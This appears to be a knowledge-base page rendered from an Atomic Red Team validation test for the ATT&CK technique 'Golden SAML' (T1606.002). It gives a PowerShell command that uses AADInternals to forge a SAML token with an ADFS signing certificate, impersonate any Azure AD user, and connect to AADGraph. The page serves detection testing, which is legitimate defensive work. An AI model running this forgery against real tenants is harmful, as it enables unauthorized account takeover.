---
atomic_guid: "b16a03bc-1089-4dcc-ad98-30fe8f3a2b31"
title: "Golden SAML"
framework: "atomic"
generated: "true"
attack_technique_id: "T1606.002"
attack_technique_name: "Forge Web Credentials: SAML token"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1606.002/T1606.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "b16a03bc-1089-4dcc-ad98-30fe8f3a2b31"
  - "Golden SAML"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Golden SAML

Forge a "Golden SAML" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). 
You will need the ADFS token signing certificate (see T1552.004 to export it).
More info here : https://o365blog.com/post/adfs/

## Metadata

- Atomic GUID: b16a03bc-1089-4dcc-ad98-30fe8f3a2b31
- Technique: T1606.002: Forge Web Credentials: SAML token
- Platforms: azure-ad
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1606.002/T1606.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1606-forge_web_credentials|T1606.002]]

## Input Arguments

### certificate_path

- description: Token signing certificate path. See T1552.004 to export it
- type: path
- default: .\ADFS_signing.pfx

### immutable_id

- description: ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString "username").ImmutableId
- type: string
- default: aehgdqBTZV50DKQZmNJ8mg==

### issuer_uri

- description: Issuer URI of the ADFS service
- type: string
- default: http://contoso.com/adfs/services/trust/

## Dependencies

AADInternals module must be installed.

### Prerequisite Check

```text
if (Get-Module AADInternals) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Install-Module -Name AADInternals -Force
```

## Executor

- name: powershell

### Command

```powershell
Import-Module AADInternals -Force
$saml = New-AADIntSAMLToken -ImmutableID "#{immutable_id}" -PfxFileName "#{certificate_path}" -Issuer "#{issuer_uri}"
$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
if ($conn) { Write-Host "`nSuccessfully connected as $($conn.User)" } else { Write-Host "`nThe connection failed" }
Write-Host "End of Golden SAML"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1606.002/T1606.002.yaml)
